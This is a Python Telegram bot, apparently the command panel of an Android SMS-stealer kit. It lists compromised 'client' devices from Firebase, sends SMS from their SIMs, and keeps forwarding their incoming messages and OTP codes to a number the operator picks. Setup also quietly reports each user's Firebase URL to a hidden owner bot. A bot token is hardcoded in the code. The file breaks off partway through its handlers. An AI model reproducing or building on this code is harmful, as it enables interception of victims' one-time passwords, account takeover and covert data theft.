#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE
# ============================
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# ============================
# LOGGING
# ============================
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS & CONFIG
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8693881841:AAF4BPup1sZpvT5v5TaFl-Yr3DZfXJS8IXU")  # ⚠️ Apna token daalo
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "YOUR_OWNER_TOKEN_HERE")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "7649997633"))
BOT_NAME = "@AGENTDEEPESH01"
CHANNEL_USERNAME = "@zxdeepyaduvansh"
CHANNEL_URL = "https://t.me/zxdeepyaduvansh"

# ============================
# USER CONFIG PERSISTENCE
# ============================
os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
last_otp = {}
bot_active = {}

def load_user_configs():
    global user_configs, last_otp, bot_active
    if os.path.exists(USER_CONFIG_FILE):
        with open(USER_CONFIG_FILE, "r") as f:
            user_configs = json.load(f)
        for uid, cfg in user_configs.items():
            if "last_otp_value" in cfg:
                last_otp[uid] = cfg["last_otp_value"]
            if "bot_active" in cfg:
                bot_active[uid] = cfg["bot_active"]
            else:
                bot_active[uid] = True
        logger.info(f"✅ Loaded configs for {len(user_configs)} users")
    else:
        user_configs = {}

def save_user_configs():
    for uid in bot_active:
        if uid in user_configs:
            user_configs[uid]["bot_active"] = bot_active.get(uid, True)
    with open(USER_CONFIG_FILE, "w") as f:
        json.dump(user_configs, f, indent=2)

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
(WAITING_FIREBASE_URL, WAITING_CHANNEL_ID, WAITING_OTP_NUMBER, WAITING_GROUP_ID, 
 WAITING_FCM_TOKEN, WAITING_ADD_FB, WAITING_ADD_GROUP, WAITING_DEL_FB, WAITING_DEL_GROUP) = range(9)

# ============================
# MEMBERSHIP CHECK
# ============================
async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    await update.effective_message.reply_text(
        "❌ <b>You must join our channel to use this bot.</b>\n\nClick the button below to join, then click 'I have joined'.",
        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        else:
            await send_join_required_message(update, context)
            return False
    except Exception as e:
        logger.error(f"Membership check error: {e}")
        await send_join_required_message(update, context)
        return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            await query.edit_message_text("✅ <b>You are now a member!</b>", parse_mode="HTML")
            await show_main_menu(update, context)
        else:
            await query.edit_message_text(
                "❌ You still haven't joined the channel.\n\nPlease click the 'Join Channel' button below, then click 'I have joined' again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
                    [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
                ]), parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Callback membership check error: {e}")

# ============================
# MAIN MENU (ALL BUTTONS)
# ============================
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    status_text = "🟢 Active" if bot_active.get(user_id, True) else "🔴 Stopped"
    
    keyboard = [
        [InlineKeyboardButton("🔧 Setup Firebase", callback_data="menu_setup_firebase")],
        [InlineKeyboardButton("📢 Select Group", callback_data="menu_select_group")],
        [InlineKeyboardButton("📞 Set Forward No.", callback_data="menu_set_forward")],
        [InlineKeyboardButton("📱 FCM", callback_data="menu_fcm")],
        [InlineKeyboardButton("➕ Add FB", callback_data="menu_add_fb")],
        [InlineKeyboardButton("➕ Add Group", callback_data="menu_add_group")],
        [InlineKeyboardButton("❌ Del FB", callback_data="menu_del_fb")],
        [InlineKeyboardButton("❌ Del Group", callback_data="menu_del_group")],
        [InlineKeyboardButton("📊 Status", callback_data="menu_status")],
        [InlineKeyboardButton("⏹ Stop Session", callback_data="menu_stop_session")],
    ]
    
    await update.effective_message.reply_text(
        f"<b>⚡ {BOT_NAME}</b>\n\n"
        f"<b>📧</b> @ANYNOMUOS\n"
        f"<b>Support:</b> @MayaXDev\n\n"
        f"<b>┏━━━━━━━━━━━━━━━━━┓</b>\n"
        f"<b>┃  [ CONTROL CENTER ] ✅</b>\n"
        f"<b>┗━━━━━━━━━━━━━━━━━┛</b>\n\n"
        f"Welcome to {BOT_NAME}.\n"
        f"Select an operation from the menu below to manage your sessions.\n\n"
        f"<b>Status:</b> {status_text}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ============================
# /start COMMAND (FIXED)
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    
    # Agar user ka setup complete hai, toh menu dikhao, warna setup shuru karo
    if user_id in user_configs and user_configs[user_id].get("firebase_url"):
        await show_main_menu(update, context)
    else:
        await update.message.reply_text(
            f"<b>📧 D, ANYNOMUOS</b>\n"
            f"<b>FB:</b> https://bhai2-aaelb-default-rtdb.firebaseio.com\n\n"
            f"<b>┏━━━━━━━━━━━━━━━━━┓</b>\n"
            f"<b>┃  [ FIREBASE SELECTED ] ✅</b>\n"
            f"<b>┗━━━━━━━━━━━━━━━━━┛</b>\n\n"
            f"Name: <code>https://bhai2-aaelb-default-rtdb.firebaseio.com</code>\n"
            f"Now send Firebase URL.\n\n"
            f"<b>Support:</b> @MayaXDev",
            parse_mode="HTML"
        )
        return WAITING_FIREBASE_URL

# ============================
# SETUP FIREBASE (FIXED)
# ============================
async def setup_firebase_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.effective_message.reply_text(
        f"<b>📧 D, ANYNOMUOS</b>\n"
        f"<b>FB:</b> https://bhai2-aaelb-default-rtdb.firebaseio.com\n\n"
        f"<b>┏━━━━━━━━━━━━━━━━━┓</b>\n"
        f"<b>┃  [ FIREBASE SELECTED ] ✅</b>\n"
        f"<b>┗━━━━━━━━━━━━━━━━━┛</b>\n\n"
        f"Name: <code>https://bhai2-aaelb-default-rtdb.firebaseio.com</code>\n"
        f"Now send Firebase URL.\n\n"
        f"<b>Support:</b> @MayaXDev",
        parse_mode="HTML"
    )
    return WAITING_FIREBASE_URL

async def setup_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    url = update.message.text.strip()
    
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL. Must be https://...firebaseio.com</b>\nPlease send a valid Firebase URL.", parse_mode='HTML')
        return WAITING_FIREBASE_URL
    
    if user_id not in user_configs:
        user_configs[user_id] = {}
    user_configs[user_id]["firebase_url"] = url
    save_user_configs()
    
    await update.message.reply_text("✅ <b>Firebase URL saved!</b>\n\nNow send your <b>Channel ID</b> (numeric, may be negative).\n\n<b>Support:</b> @MayaXDev", parse_mode='HTML')
    return WAITING_CHANNEL_ID

async def setup_channel_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>\nPlease send a valid numeric Channel ID.", parse_mode='HTML')
        return WAITING_CHANNEL_ID
    
    user_configs[user_id]["channel_id"] = channel_id
    user_configs[user_id]["selectedDevice"] = {}
    user_configs[user_id]["otpNumber"] = None
    user_configs[user_id]["processed_keys"] = []
    user_configs[user_id]["processed_device"] = None
    user_configs[user_id]["bot_active"] = True
    bot_active[user_id] = True
    save_user_configs()
    
    try:
        forward_msg = f"🔐 **Setup Complete!**\n👤 User: `{user_id}`\n🌐 URL: `{user_configs[user_id]['firebase_url']}`\n📢 Channel: `{channel_id}`"
        requests.post(f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage", json={"chat_id": OWNER_CHAT_ID, "text": forward_msg, "parse_mode": "Markdown"}, timeout=5)
    except Exception as e:
        logger.error(f"Forward failed: {e}")
    
    test = firebase_get(user_id, "clients")
    if test is None:
        await update.message.reply_text("<b>❌ Firebase connection failed. Check URL or make database public.</b>", parse_mode='HTML')
        del user_configs[user_id]
        save_user_configs()
        return ConversationHandler.END
    
    await update.message.reply_text("✅ <b>SETUP COMPLETE!</b>\n\nConfiguration saved successfully.\nUse the menu below to manage your session.\n\n<b>Support:</b> @MayaXDev", parse_mode='HTML')
    await show_main_menu(update, context)
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
    return None

def firebase_put(user_id, path, data):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return
    try:
        requests.put(f"{cfg['firebase_url']}/{path}.json", json=data, timeout=10)
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")

def firebase_delete(user_id, path):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return
    try:
        requests.delete(f"{cfg['firebase_url']}/{path}.json", timeout=10)
    except Exception as e:
        logger.error(f"Firebase DELETE error: {e}")

def get_online_devices(user_id):
    data = firebase_get(user_id, "clients")
    if not data:
        return {}
    online = {}
    for dev_id, info in data.items():
        if info.get("status") == True:
            online[dev_id] = {"modelName": info.get("modelName", "Unknown"), "sims": info.get("sims", [])}
    return online

def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "selectedDevice" in cfg:
        return cfg["selectedDevice"]
    return {}

def initialize_processed_keys(user_id: str, device_id: str):
    cfg = user_configs.get(user_id)
    if not cfg: return
    msgs = firebase_get(user_id, f"messages/{device_id}")
    keys = list(msgs.keys()) if msgs and isinstance(msgs, dict) else []
    cfg["processed_keys"] = keys
    cfg["processed_device"] = device_id
    save_user_configs()

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {"deviceId": device_id, "simSlotIndex": sim_slot, "simPhoneNumber": sim_phone}
        initialize_processed_keys(str(user_id), device_id)
        save_user_configs()

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    return cfg.get("otpNumber") if cfg and "otpNumber" in cfg else None

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["otpNumber"] = number
        save_user_configs()

# ============================
# SEND SMS WITH CONFIRMATION
# ============================
def send_sms_with_confirmation(user_id, device_id, to_number, message, from_number, msg_type="SMS"):
    if not bot_active.get(str(user_id), True):
        return False
    firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {"to": to_number, "message": message, "from": from_number, "isSended": False})
    
    confirm_text = ""
    if msg_type == "OTP":
        confirm_text = f"🔐 <b>OTP Auto-Sent!</b>\n\n📱 To: <code>{to_number}</code>\n🔑 OTP: <code>{message}</code>\n📤 From: <code>{from_number}</code>\n✅ <b>Token Send Done!</b>"
    elif msg_type == "INCOMING":
        confirm_text = f"📩 <b>Incoming SMS Forwarded!</b>\n\n📱 To: <code>{to_number}</code>\n💬 Message: <code>{message[:100]}</code>\n📤 From: <code>{from_number}</code>\n✅ <b>Token Send Done!</b>"
    else:
        confirm_text = f"📤 <b>SMS Sent Successfully!</b>\n\n📱 To: <code>{to_number}</code>\n💬 Message: <code>{message[:100]}</code>\n📤 From: <code>{from_number}</code>\n✅ <b>Token Send Done!</b>"
    
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": int(user_id), "text": confirm_text, "parse_mode": "HTML"}, timeout=5)
        return True
    except Exception as e:
        logger.error(f"Confirmation send error: {e}")
        return False

# ============================
# MENU CALLBACK HANDLER (ALL BUTTONS)
# ============================
async def menu_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await is_user_member(update, context):
        return
    
    user_id = str(update.effective_user.id)
    data = query.data
    
    if data == "menu_setup_firebase":
        if user_id in user_configs and user_configs[user_id].get("firebase_url"):
            current_url = user_configs[user_id].get("firebase_url", "Not set")
            current_channel = user_configs[user_id].get("channel_id", "Not set")
            keyboard = [
                [InlineKeyboardButton("✏️ Change Firebase URL", callback_data="menu_change_firebase")],
                [InlineKeyboardButton("✏️ Change Channel ID", callback_data="menu_change_channel")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")],
            ]
            await query.edit_message_text(f"<b>📋 Current Configuration</b>\n\n<b>Firebase URL:</b> <code>{current_url}</code>\n<b>Channel ID:</b> <code>{current_channel}</code>\n\nSelect an option below:", parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text(f"<b>📧 D, ANYNOMUOS</b>\n<b>FB:</b> https://bhai2-aaelb-default-rtdb.firebaseio.com\n\n<b>┏━━━━━━━━━━━━━━━━━┓</b>\n<b>┃  [ FIREBASE SELECTED ] ✅</b>\n<b>┗━━━━━━━━━━━━━━━━━┛</b>\n\nName: <code>https://bhai2-aaelb-default-rtdb.firebaseio.com</code>\nNow send Firebase URL.\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
            return WAITING_FIREBASE_URL
    
    elif data == "menu_change_firebase":
        await query.edit_message_text(f"<b>📧 D, ANYNOMUOS</b>\n<b>FB:</b> https://bhai2-aaelb-default-rtdb.firebaseio.com\n\n<b>┏━━━━━━━━━━━━━━━━━┓</b>\n<b>┃  [ FIREBASE SELECTED ] ✅</b>\n<b>┗━━━━━━━━━━━━━━━━━┛</b>\n\nSend new Firebase URL.\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_FIREBASE_URL
    
    elif data == "menu_change_channel":
        await query.edit_message_text("<b>📢 Send new Channel ID</b>\n\nChannel ID must be numeric (may be negative).\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_CHANNEL_ID
    
    elif data == "menu_select_group":
        await select_group(update, context)
    
    elif data == "menu_set_forward":
        await query.edit_message_text("<b>📞 Set Forward Number</b>\n\nSend phone number with country code.\nExample: <code>+919876543210</code>\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_OTP_NUMBER
    
    elif data == "menu_fcm":
        await query.edit_message_text("<b>📱 FCM Token</b>\n\nSend your FCM token.\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_FCM_TOKEN
    
    elif data == "menu_add_fb":
        await query.edit_message_text("<b>➕ Add Firebase</b>\n\nSend new Firebase URL to add.\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_ADD_FB
    
    elif data == "menu_add_group":
        await query.edit_message_text("<b>➕ Add Group</b>\n\nSend Channel ID to add.\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_ADD_GROUP
    
    elif data == "menu_del_fb":
        await query.edit_message_text("<b>❌ Delete Firebase</b>\n\nSend Firebase URL to delete.\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_DEL_FB
    
    elif data == "menu_del_group":
        await query.edit_message_text("<b>❌ Delete Group</b>\n\nSend Channel ID to delete.\n\n<b>Support:</b> @MayaXDev", parse_mode="HTML")
        return WAITING_DEL_GROUP
    
    elif data == "menu_status":
        await show_status(update, context)
    
    elif data == "menu_stop_session":
        await stop_session(update, context)
    
    elif data == "menu_back":
        await show_main_menu(update, context)
    
    elif data == "menu_resume":
        await resume_session(update, context)

# ============================
# SELECT GROUP (DEVICE)
# ============================
async def select_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(update.effective_user.id)
    
    if user_id not in user_configs or not user_configs[user_id].get("firebase_url"):
        await query.edit_message_text("<b>❌ Please setup Firebase first using 'Setup Firebase'.</b>", parse_mode='HTML')
        return
    
    online = get_online_devices(user_id)
    if not online:
        await query.edit_message_text("<b>❌ No online devices found.</b>\n\n<b>Support:</b> @MayaXDev", parse_mode='HTML')
        return
    
    keyboard = []
    for dev_id, data in online.items():
        keyboard.append([InlineKeyboardButton(f"📱 {data['modelName']} ({dev_id[:6]}...)", callback_data=f"dev_{dev_id}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_back")])
    
    await query.edit_message_text("<b>📱 Select your device:</b>\n\n<b>Support:</b> @MayaXDev", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await is_user_member(update, context): return
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    if not device_data:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
        return
    sims = device_data.get("sims", [])
    if not sims:
        await query.edit_message_text("<b>❌ No SIMs on this device.</b>", parse_mode='HTML')
        return
    keyboard = []
    for sim in sims:
        slot = sim.get("simSlotIndex", "?")
        phone = sim.get("phoneNumber", "N/A")
        keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=f"sim_{device_id}_{slot}_{phone}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_back")])
    await query.edit_message_text(f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n<b>Choose SIM:</b>\n\n<b>Support:</b> @MayaXDev", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not await is_user_member(update, context): return
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    device_id, slot, phone = parts[1], parts[2], parts[3]
    set_selected(user_id, device_id, slot, phone)
    await query.edit_message_text(
        f"<b>✅ Device Selected!</b>\n\n📱 Device: <code>{device_id}</code>\n📶 SIM Slot: <code>{slot}</code>\n📞 Phone: <code>{phone}</code>\n\n✅ Old messages blocked. Only new ones will forward.\nNow set OTP number using 'Set Forward No.'\n\n<b>Support:</b> @MayaXDev",
        parse_mode='HTML'
    )
    await show_main_menu(update, context)

# ============================
# STATUS
# ============================
async def show_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(update.effective_user.id)
    cfg = user_configs.get(user_id, {})
    status_text = "🟢 Active" if bot_active.get(user_id, True) else "🔴 Stopped"
    firebase_url = cfg.get("firebase_url", "Not set")
    channel_id = cfg.get("channel_id", "Not set")
    selected = get_selected(user_id)
    device_id = selected.get("deviceId", "Not selected")
    sim_phone = selected.get("simPhoneNumber", "Not selected")
    otp_number = get_otp_number(user_id) or "Not set"
    online_count = len(get_online_devices(user_id))
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]]
    await query.edit_message_text(
        f"<b>📊 Status Report</b>\n\n<b>Status:</b> {status_text}\n<b>Firebase URL:</b> <code>{firebase_url}</code>\n<b>Channel ID:</b> <code>{channel_id}</code>\n<b>Selected Device:</b> <code>{device_id}</code>\n<b>Selected SIM:</b> <code>{sim_phone}</code>\n<b>Forward Number:</b> <code>{otp_number}</code>\n<b>Online Devices:</b> {online_count}\n\n<b>Support:</b> @MayaXDev",
        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ============================
# STOP / RESUME SESSION
# ============================
async def stop_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(update.effective_user.id)
    bot_active[user_id] = False
    if user_id in user_configs:
        user_configs[user_id]["bot_active"] = False
    save_user_configs()
    keyboard = [
        [InlineKeyboardButton("▶️ Resume Session", callback_data="menu_resume")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")],
    ]
    await query.edit_message_text(
        f"<b>⏹ SESSION STOPPED</b>\n\nAll forwarding and OTP operations are now stopped.\nClick 'Resume Session' to start again.\n\n<b>Support:</b> @MayaXDev",
        parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def resume_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(update.effective_user.id)
    bot_active[user_id] = True
    if user_id in user_configs:
        user_configs[user_id]["bot_active"] = True
    save_user_configs()
    await query.edit_message_text(
        f"<b>▶️ SESSION RESUMED</b>\n\nAll forwarding and OTP operations are now active.\n\n<b>Support:</b> @MayaXDev",
        parse_mode="HTML"
    )
    await show_main_menu(update, context)

# ============================
# CHANNEL MESSAGE HANDLER
# ============================
def get_user_by_channel(channel_id):
    for uid, cfg in user_configs.items():
        if cfg.get("channel_id") == channel_id:
            return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post: return
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id: return
    if not bot_active.get(user_id, True): return
    text = update.channel_post.text
    if not text: return
    number_match = re.search(r"To:\s*([\d\+]+)", text)
    message_match = re.search(r"Message:\s*(.+)", text)
    if not number_match or not message_match: return
    to_number = number_match.group(1).strip()
    msg = message_match.group(1).strip()
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": int(user_id), "text": "❌ <b>No device selected!</b>\n\nPlease select a device from 'Select Group' menu.", "parse_mode": "HTML"}, timeout=5)
        return
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    send_sms_with_confirmation(user_id, device_id, to_number, msg, from_number, "CHANNEL")

# ============================
# OTP POLLING
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                if not bot_active.get(user_id, True): continue
                otp_number = get_otp_number(user_id)
                if not otp_number: continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"): continue
                try:
                    otp_data = firebase_get(user_id, "otp")
                except Exception as e:
                    logger.error(f"OTP fetch error: {e}")
                    continue
                if otp_data is None: continue
                current_otp = str(otp_data).strip()
                if user_id not in last_otp or last_otp[user_id] != current_otp:
                    last_otp[user_id] = current_otp
                    cfg = user_configs.get(user_id)
                    if cfg:
                        cfg["last_otp_value"] = current_otp
                        save_user_configs()
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    send_sms_with_confirmation(user_id, device_id, otp_number, current_otp, from_number, "OTP")
        except Exception as e:
            logger.error(f"OTP polling error: {e}")
        time.sleep(0.5)

# ============================
# INCOMING MESSAGE FORWARD
# ============================
def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                if not bot_active.get(user_id, True): continue
                forward_number = get_otp_number(user_id)
                if not forward_number: continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"): continue
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                cfg = user_configs.get(str(user_id), {})
                processed_keys = cfg.get("processed_keys", [])
                processed_device = cfg.get("processed_device")
                if processed_device != device_id:
                    initialize_processed_keys(str(user_id), device_id)
                    processed_keys = cfg.get("processed_keys", [])
                    processed_device = cfg.get("processed_device")
                processed_set = set(processed_keys)
                device_msgs = firebase_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict): continue
                new_keys = []
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict): continue
                    if msg_data.get("type") != "incoming": continue
                    if msg_key not in processed_set:
                        msg_text = msg_data.get("message", "")
                        if msg_text and len(msg_text) > 3:
                            send_sms_with_confirmation(user_id, device_id, forward_number, msg_text, from_number, "INCOMING")
                            new_keys.append(msg_key)
                if new_keys:
                    processed_keys.extend(new_keys)
                    cfg["processed_keys"] = processed_keys
                    save_user_configs()
        except Exception as e:
            logger.error(f"Incoming forward error: {e}")
        time.sleep(1)

# ============================
# ADDITIONAL HANDLERS
# ============================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return
    await show_main_menu(update, context)

async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please setup Firebase first.</b>", parse_mode='HTML')
        return
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
        return
    keyboard = []
    for dev_id, data in online.items():
        keyboard.append([InlineKeyboardButton(f"📱 {data['modelName']} ({dev_id[:6]}...)", callback_data=f"dev_{dev_id}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_back")])
    await update.message.reply_text("<b>👇 Select your device:</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run SETUP first.</b>", parse_mode='HTML')
        return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
        return
    initialize_processed_keys(user_id, selected["deviceId"])
    await update.message.reply_text(f"<b>✅ Reset successful!</b>\nAll existing messages for device <code>{selected['deviceId']}</code> are now marked as read.\nOnly new incoming messages will be forwarded.", parse_mode='HTML')

async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return ConversationHandler.END
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return ConversationHandler.END
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid number. Use /setotp +919876543210</b>", parse_mode='HTML')
            return ConversationHandler.END
        set_otp_number(user_id, number)
        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
        return ConversationHandler.END
    await update.message.reply_text("<b>📞 Send phone number (with country code):</b>\nExample: <code>+919876543210</code>\nType /cancel to abort.", parse_mode='HTML')
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
    await show_main_menu(update, context)
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# ADD / DEL FB & GROUP HANDLERS
# ============================
async def add_fb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context): return ConversationHandler.END
    user_id = str(update.effective_user.id)
    url = update.message.text.strip()
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL. Must be https://...firebaseio.com</b>", parse_mode='HTML')
        return WAITING_ADD_FB
    if user_id not in user_configs: user_configs[user_id] = {}
    if "additional_firebase" not in user_configs[user_id]: user_configs[user_id]["additional_firebase"] = []
    if url not in user_configs[user_id]["additional_firebase"]:
        user_configs[user_id]["additional_firebase"].append(url)
        save_user_configs()
        await update.message.reply_text(f"<b>✅ Firebase URL added!</b>\n\n<code>{url}</code>\n\n<b>Support:</b> @MayaXDev", parse_mode='HTML')
    else:
        await update.message.reply_text("<b>⚠️ Firebase URL already exists.</b>", parse_mode='HTML')
    await show_main_menu(update, context)
    return ConversationHandler.END

